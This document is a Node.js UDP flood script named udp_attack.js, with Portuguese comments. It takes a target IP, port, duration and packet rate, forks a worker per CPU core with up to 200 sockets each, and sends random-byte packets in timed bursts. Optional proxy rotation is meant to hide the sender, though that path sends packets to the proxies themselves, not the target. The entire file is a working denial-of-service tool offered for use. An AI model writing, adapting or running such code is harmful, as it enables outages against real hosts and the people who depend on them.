const dgram = require('dgram');
const fs = require('fs');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');

if (process.argv.length <= 6) {
    console.log("Usage: node udp_attack.js [TARGET_IP] [TARGET_PORT] [DURATION] [PACKET_SIZE] [RATE] [PROXY_FILE]");
    console.log("Example: node udp_attack.js 192.168.1.1 80 60 1024 10000 proxy.txt");
    process.exit(-1);
}

const targetIp = process.argv[2];
const targetPort = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);
const packetSize = parseInt(process.argv[5]);
const rate = parseInt(process.argv[6]);
const proxyFile = process.argv[7] || '';

// Carrega proxies do arquivo
let proxies = [];
if (proxyFile && fs.existsSync(proxyFile)) {
    try {
        const proxyData = fs.readFileSync(proxyFile, 'utf8').split('\n').filter(line => line.trim());
        proxies = proxyData.map(line => {
            const parts = line.trim().split(':');
            if (parts.length >= 2) {
                return {
                    host: parts[0],
                    port: parseInt(parts[1]),
                    username: parts[2] || null,
                    password: parts[3] || null
                };
            }
            return null;
        }).filter(proxy => proxy !== null);
        
        console.log(`Loaded ${proxies.length} proxies from ${proxyFile}`);
    } catch (error) {
        console.error('Error loading proxy file:', error.message);
    }
}

const numCPUs = os.cpus().length;
const ratePerWorker = Math.floor(rate / numCPUs);

if (cluster.isMaster) {
    console.log(`Starting enhanced UDP attack on ${targetIp}:${targetPort} using ${numCPUs} worker processes`);
    console.log(`Total rate: ${rate} packets/sec, ${ratePerWorker} packets/sec per worker`);
    if (proxies.length > 0) {
        console.log(`Using ${proxies.length} proxies for rotation`);
    }
    
    // Inicia um worker para cada CPU
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork({
            workerId: i,
            workerRate: ratePerWorker
        });
    }
    
    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.process.pid} died`);
    });
} else {
    // Código que cada worker executará
    const workerId = process.env.workerId;
    const workerRate = parseInt(process.env.workerRate);
    
    // Número de sockets por worker
    const socketsPerWorker = Math.min(200, workerRate);
    const sockets = [];
    
    // Pool de pacotes maior para aproveitar a RAM
    const packetPoolSize = 1000;
    const packetPool = [];
    
    for (let i = 0; i < packetPoolSize; i++) {
        packetPool.push(crypto.randomBytes(packetSize));
    }
    
    function getRandomPacket() {
        return packetPool[Math.floor(Math.random() * packetPoolSize)];
    }
    
    // Função para obter proxy aleatório
    function getRandomProxy() {
        if (proxies.length === 0) return null;
        return proxies[Math.floor(Math.random() * proxies.length)];
    }
    
    const startTime = Date.now();
    
    // Função de envio com suporte a proxy
    async function sendBurst(socketIndex) {
        const socket = sockets[socketIndex];
        const packetsPerBurst = Math.ceil(workerRate / socketsPerWorker / 20);
        const burstInterval = 50;
        
        // Configura proxy para este socket se disponível
        let currentProxy = getRandomProxy();
        
        const sendInterval = setInterval(() => {
            const now = Date.now();
            if (now - startTime > duration * 1000) {
                clearInterval(sendInterval);
                socket.close();
                if (socketIndex === 0) {
                    console.log(`Worker ${workerId} finished`);
                }
                return;
            }
            
            // Rotaciona proxy periodicamente
            if (Math.random() < 0.1 && proxies.length > 0) {
                currentProxy = getRandomProxy();
            }
            
            // Envia pacotes através do proxy se disponível
            for (let i = 0; i < packetsPerBurst; i++) {
                const packet = getRandomPacket();
                
                if (currentProxy) {
                    // Envia através do proxy
                    socket.send(packet, 0, packet.length, currentProxy.port, currentProxy.host, (err) => {
                        if (err) {
                            // Tente com outro proxy se houver erro
                            currentProxy = getRandomProxy();
                        }
                    });
                } else {
                    // Envia diretamente se não houver proxy
                    socket.send(packet, 0, packet.length, targetPort, targetIp);
                }
            }
        }, burstInterval);
    }
    
    // Cria sockets e inicia envio
    for (let i = 0; i < socketsPerWorker; i++) {
        sockets.push(dgram.createSocket('udp4'));
        sendBurst(i);
    }
}